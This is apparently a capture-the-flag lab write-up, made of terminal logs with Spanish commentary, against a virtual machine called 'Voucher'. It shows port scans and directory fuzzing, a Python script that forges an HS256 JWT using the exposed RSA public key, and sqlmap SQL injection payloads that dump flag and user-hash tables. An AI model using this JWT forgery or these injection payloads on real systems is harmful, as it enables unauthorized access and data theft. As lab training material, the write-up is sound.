──(kali㉿kali)-[~/Documents/Voucher]
└─$ nmap -sS -p- --open --min-rate 5000 -Pn -n 192.168.56.9 -oN scan.txt                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 16:10 EDT
Nmap scan report for 192.168.56.9
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:12:3A:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.05 seconds


====================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ nmap -sVC -p22,80,8080 -vvv -n -Pn 192.168.56.9 -oN fullscan.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 16:11 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
Initiating ARP Ping Scan at 16:11
Scanning 192.168.56.9 [1 port]
Completed ARP Ping Scan at 16:11, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:11
Scanning 192.168.56.9 [3 ports]
Discovered open port 8080/tcp on 192.168.56.9
Discovered open port 80/tcp on 192.168.56.9
Discovered open port 22/tcp on 192.168.56.9
Completed SYN Stealth Scan at 16:11, 0.02s elapsed (3 total ports)
Initiating Service scan at 16:11
Scanning 3 services on 192.168.56.9
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 16:11, 6.17s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.56.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.53s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
Nmap scan report for 192.168.56.9
Host is up, received arp-response (0.00034s latency).
Scanned at 2025-10-22 16:11:20 EDT for 7s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4a:57:d3:b8:32:93:f3:e7:da:cd:8f:75:ad:fb:98:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGhWzcmvHbO6azg60JvXG63qNLlG0s10PEcOA0h4tGr66bxl1UkXAjRNtGw9LpADbICGy7/Z0pWZD9Cdug+CyHY=
|   256 96:75:da:7a:5b:51:3e:a4:cd:17:b6:36:7d:18:7e:3f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHCVFXSYgXB6NPdl3arjR6GGnyidPucKlOMEwd7kjrkW
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    syn-ack ttl 64 PHP cli server 5.5 or later (PHP 8.3.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: CyberShield Academy \xE2\x80\x94 Advanced Cybersecurity Training
MAC Address: 08:00:27:12:3A:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)


====================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ whatweb http://192.168.56.9                   
http://192.168.56.9 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[192.168.56.9], Title[Apache2 Ubuntu Default Page: It works]                                                                                                                
                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ whatweb http://192.168.56.9:8080/
http://192.168.56.9:8080/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[192.168.56.9], PHP[8.3.6], Script, Title[CyberShield Academy — Advanced Cybersecurity Training], X-Powered-By[PHP/8.3.6]                                                                                             
                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ 
====================================================================================================================================================================




──(kali㉿kali)-[~/Documents/Voucher]
└─$ wfuzz -c --hc=400,404 --hl=126  -u "http://192.168.56.9:8080/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.9:8080/FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                          
=====================================================================

000005068:   200        1 L      4 W        79 Ch       "keys"                                                                           
000147065:   200        126 L    361 W      4345 Ch     "59340"                                                                          

Total time: 283.2523
Processed Requests: 147061
Filtered Requests: 147060
Requests/sec.: 519.1872









====================================================================================================================================================================
                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ wfuzz -c --hc=400,404  -u "http://192.168.56.9:8080/keys/FUZZ.FUZ2Z" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,pem,pub,cert -t 20 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.9:8080/keys/FUZZ.FUZ2Z
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                          
=====================================================================

000000001:   200        1 L      4 W        79 Ch       "# directory-list-2.3-medium.txt - pem"                                          
000000011:   200        1 L      4 W        79 Ch       "# Priority ordered case-sensitive list, where entries were found - pem"         
000000005:   200        1 L      4 W        79 Ch       "# This work is licensed under the Creative Commons - pem"                       
000000013:   200        1 L      4 W        79 Ch       "# - pem"                                                                        
000000006:   200        1 L      4 W        79 Ch       "# Attribution-Share Alike 3.0 License. To view a copy of this - pem"            
000000009:   200        1 L      4 W        79 Ch       "# Suite 300, San Francisco, California, 94105, USA. - pem"                      
000000012:   200        1 L      4 W        79 Ch       "# on at least 2 different hosts - pem"                                          
000000002:   200        1 L      4 W        79 Ch       "# - pem"                                                                        
000000003:   200        1 L      4 W        79 Ch       "# Copyright 2007 James Fisher - pem"                                            
000000008:   200        1 L      4 W        79 Ch       "# or send a letter to Creative Commons, 171 Second Street, - pem"               
000000007:   200        1 L      4 W        79 Ch       "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - pem"          
000000004:   200        1 L      4 W        79 Ch       "# - pem"                                                                        
000000010:   200        1 L      4 W        79 Ch       "# - pem"                                                                        
000000221:   200        9 L      13 W       451 Ch      "public - pem"                                                                   

Total time: 0
Processed Requests: 220559
Filtered Requests: 220545
Requests/sec.: 0


====================================================================================================================================================================

                                                                                                                                               
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ wget http://192.168.56.9:8080/keys/public.pem  
--2025-10-22 16:52:42--  http://192.168.56.9:8080/keys/public.pem
Connecting to 192.168.56.9:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 451 [application/x-x509-ca-cert]
Saving to: ‘public.pem’

public.pem                           100%[====================================================================>]     451  --.-KB/s    in 0s      

2025-10-22 16:52:42 (47.9 MB/s) - ‘public.pem’ saved [451/451]

                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ ls 
fullscan.txt  public.pem  scan.txt
                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ cat public.pem 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApDzyDfHCClQNka8/CF2q
Il0c0hvfIYS6eFHvMW8z+ERBfUls3UijaFWHYMUKPEuWQIeDbbact225OZNVt6gH
CyPP9DEmr0AEKTqd6vc0nAOFhRPim4wFe5Eedq5RVcqpRhd4uchEKGzYNa6XLm37
lX0GmWt2dpWx/wcrGiBqvpCieh89CTUvINVhFHhFnX44T/3atJkXaYQu330wYs8v
2ge/sEHI988fpGv74liVh7q/nhrOf8ZXFE3MOJNOp9sCtL4HFASAc/RXwuoErjW0
tcAiatPYlrWIFezMpFXEiTf5vXG9Zj0K7vFhJUN+QaxTrmH988LhRxsMUhzZZ/sb
nwIDAQAB
-----END PUBLIC KEY-----



====================================================================================================================================================================


──(kali㉿kali)-[~/Documents/Voucher]
└─$ nano scripJson.py                                               



Explotación
Con este llave vamos a intentar falsificar un Json Web Token esperando que el servidor esté mal configurado y únicamente firme el token con la llave pública que hemos encontrado.

Para ello, usamos el siguiente script de python3:



```bash 
import json, base64, hmac, hashlib

# Functions
def b64url_encode(data):
    s = base64.urlsafe_b64encode(data).rstrip(b"=")
    return s.decode("ascii")

def b64url_encode_json(obj):
    j = json.dumps(obj, separators=(',', ':'), sort_keys=True)
    return b64url_encode(j.encode('utf-8'))

def hmac_sha256(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()

def build_token(header_obj, payload_obj, key_bytes):
    encoded_header = b64url_encode_json(header_obj)
    encoded_payload = b64url_encode_json(payload_obj)
    signing_input = (encoded_header + "." + encoded_payload).encode('ascii')
    sig = hmac_sha256(key_bytes, signing_input)
    encoded_sig = b64url_encode(sig)
    return f"{encoded_header}.{encoded_payload}.{encoded_sig}"


# Open public.pem
with open("public.pem", "rb") as file:
        key_bytes=file.read()

# Create JWT
header = {"alg": "HS256", "typ": "JWT"}

payload = {"username": "admin"},

token= build_token(header,payload, key_bytes)

print("Token--> " + token)
```


====================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ chmod +x scripJson.py 

                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ python3 scripJson.py public.pem 
Token--> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY
                                                                                                                                                  

====================================================================================================================================================================

# Vemos que la petición se tramita mediante el método GET a /api/courses.php y le pasa el parámetro "q", así que vamos a usar curl para mandarle una petición a ese endpoint con el token generado y ver la respuesta.



view-source:http://192.168.56.9:8080/courses.php




<script>
async function runSearch() {
  const out = document.getElementById('out');
  const err = document.getElementById('err');
  out.innerHTML = '';
  err.innerHTML = '';
  const q = document.getElementById('q').value;
  const token = localStorage.getItem('token') || '';
  const r = await fetch('/api/courses.php?q=' + encodeURIComponent(q), {
    headers: {'Authorization': 'Bearer ' + token}
  });
  const j = await r.json();
  if (!r.ok) {
    err.innerHTML = '<div class="alert alert-danger">'+(j.error||'error')+(j.detail?(' — '+j.detail):'')+'</div>';
    return;
  }
  if (j.error) {
    err.innerHTML = '<div class="alert alert-danger">'+j.error+'</div>';
    return;
  }
  const list = j.results || [];
  if (list.length === 0) {
    out.innerHTML = '<div class="text-muted">No results.</div>';
  } else {
    out.innerHTML = list.map(c => `
      <div class="card mb-3 shadow-sm">
        <div class="card-body">
          <h5 class="card-title">${c.title}</h5>
          <p class="card-text">${c.description}</p>
        </div>
      </div>
    `).join('');
  }
  if (j.sql_error) {
    err.innerHTML = '<div class="alert alert-warning"><strong>SQL Error:</strong> '+j.sql_error+'</div>';
  }
}
document.getElementById('btn').addEventListener('click', runSearch);
document.getElementById('q').addEventListener('keydown', (e)=>{ if(e.key==='Enter') runSearch(); });
</script>



====================================================================================================================================================================
El token funciona. Además, observamos un sql_errors en el json de la respuesta, así que podemos intentar poner una comilla al final del parámetro para ver su comportamiento y verificar si es vulnerable a una SQL Injection.



└─$ curl -s "http://192.168.56.9:8080/api/courses.php?q=a" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY"
{
    "results": [
        {
            "id": 1,
            "title": "Offensive Security Basics",
            "description": "Hands-on intro to offensive techniques: recon, scanning, basic exploitation."
        },
        {
            "id": 2,
            "title": "Web App Pentesting",
            "description": "OWASP Top 10, manual testing workflows, tooling, and reporting."
        },
        {
            "id": 3,
            "title": "Active Directory Attacks",
            "description": "From enumeration to DCSync, tickets, and defenses."
        },
        {
            "id": 4,
            "title": "Cloud Security 101",
            "description": "Threat modeling and security controls across major cloud providers."
        }
    ],
    "sql_error": null
}                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]


====================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ curl -s "http://192.168.56.9:8080/api/courses.php?q=a'" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY"             
{
    "results": [],
    "sql_error": "SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''%'' at line 1"
}                                                                                                                                                  




====================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ sqlmap --url "http://192.168.56.9:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" --dump --batch 
        ___
       __H__                                                                                                                                      
 ___ ___[.]_____ ___ ___  {1.9.4#stable}                                                                                                          
|_ -| . [)]     | .'| . |                                                                                                                         
|___|_  ["]_|_|_|__,|  _|                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:56:41 /2025-10-22/

[16:56:41] [INFO] testing connection to the target URL
[16:56:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:56:42] [INFO] testing if the target URL content is stable
[16:56:42] [INFO] target URL content is stable
[16:56:42] [INFO] testing if GET parameter 'q' is dynamic
[16:56:42] [INFO] GET parameter 'q' appears to be dynamic
[16:56:42] [INFO] heuristic (basic) test shows that GET parameter 'q' might be injectable (possible DBMS: 'MySQL')
[16:56:42] [INFO] testing for SQL injection on GET parameter 'q'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:56:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:56:42] [WARNING] reflective value(s) found and filtering out
[16:56:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:56:42] [INFO] testing 'Generic inline queries'
[16:56:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:56:42] [INFO] GET parameter 'q' appears to be 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable 
[16:56:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:56:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:56:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:56:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:56:42] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:56:42] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[16:56:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:56:42] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:56:42] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:56:42] [INFO] GET parameter 'q' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[16:56:42] [INFO] testing 'MySQL inline queries'
[16:56:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:56:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[16:56:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[16:56:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[16:56:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[16:56:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[16:56:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:56:52] [INFO] GET parameter 'q' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:56:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:56:52] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[16:56:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:56:52] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:56:52] [INFO] target URL appears to have 3 columns in query
[16:56:52] [INFO] GET parameter 'q' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
---
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: q=1' AND 3896=3896#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: q=1' AND (SELECT 2905 FROM(SELECT COUNT(*),CONCAT(0x717a787a71,(SELECT (ELT(2905=2905,1))),0x7171627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QEKf

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=1' AND (SELECT 5502 FROM (SELECT(SLEEP(5)))RaNj)-- JFJr

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: q=1' UNION ALL SELECT NULL,NULL,CONCAT(0x717a787a71,0x4c5854545a764244514f4c76674d7554784a6d5a534d76726170686845724d705955614752725177,0x7171627871)#
---
[16:56:52] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.3.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:56:52] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[16:56:52] [INFO] fetching current database
[16:56:52] [INFO] fetching tables for database: 'academy_ctf'
[16:56:53] [INFO] fetching columns for table 'flags' in database 'academy_ctf'
[16:56:53] [INFO] fetching entries for table 'flags' in database 'academy_ctf'
[16:56:53] [INFO] recognized possible password hashes in column 'flag_value'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[16:56:53] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[16:56:53] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[16:56:53] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[16:56:53] [INFO] starting 2 processes 
[16:57:16] [WARNING] no clear password(s) found                                                                                                  
Database: academy_ctf
Table: flags
[2 entries]
+----+--------+----------------------------------+
| id | name   | flag_value                       |
+----+--------+----------------------------------+
| 1  | PRELIM | c5c990058b42fd0b07c237a2a8035ac7 |
| 2  | FINAL  | 8c694f3b9d100de3d2ee51b76db4f3cb |
+----+--------+----------------------------------+

[16:57:16] [INFO] table 'academy_ctf.flags' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.9/dump/academy_ctf/flags.csv'
[16:57:16] [INFO] fetching columns for table 'users' in database 'academy_ctf'
[16:57:16] [INFO] fetching entries for table 'users' in database 'academy_ctf'
Database: academy_ctf
Table: users
[2 entries]
+----+-----------------------------+---------+---------------------+--------------------------------------------------------------+
| id | email                       | role    | created_at          | password_hash                                                |
+----+-----------------------------+---------+---------------------+--------------------------------------------------------------+
| 1  | admin@cybershield.academy   | admin   | 2025-09-17 10:49:30 | $2y$10$EC6q5rru/hD3yPn5nwVpUOLqqRWnRR0LbOXHQ7bT7.pnAW0AmSQ1e |
| 2  | student@cybershield.academy | student | 2025-09-17 10:49:30 | $2y$10$ddDtbqJ/PauZ3hhqnIH/zOr9j8TOHNUq1UB4tiuOxWGawlHjX135m |
+----+-----------------------------+---------+---------------------+--------------------------------------------------------------+

[16:57:16] [INFO] table 'academy_ctf.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.9/dump/academy_ctf/users.csv'
[16:57:16] [INFO] fetching columns for table 'courses' in database 'academy_ctf'
[16:57:16] [INFO] fetching entries for table 'courses' in database 'academy_ctf'
Database: academy_ctf
Table: courses
[4 entries]
+----+---------------------------+---------------------+------------------------------------------------------------------------------+
| id | title                     | created_at          | description                                                                  |
+----+---------------------------+---------------------+------------------------------------------------------------------------------+
| 1  | Offensive Security Basics | 2025-09-17 10:49:30 | Hands-on intro to offensive techniques: recon, scanning, basic exploitation. |
| 2  | Web App Pentesting        | 2025-09-17 10:49:30 | OWASP Top 10, manual testing workflows, tooling, and reporting.              |
| 3  | Active Directory Attacks  | 2025-09-17 10:49:30 | From enumeration to DCSync, tickets, and defenses.                           |
| 4  | Cloud Security 101        | 2025-09-17 10:49:30 | Threat modeling and security controls across major cloud providers.          |
+----+---------------------------+---------------------+------------------------------------------------------------------------------+

[16:57:16] [INFO] table 'academy_ctf.courses' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.9/dump/academy_ctf/courses.csv'
[16:57:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.9'
[16:57:16] [WARNING] your sqlmap version is outdated

[*] ending @ 16:57:16 /2025-10-22/

                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/Voucher]
└─$ 
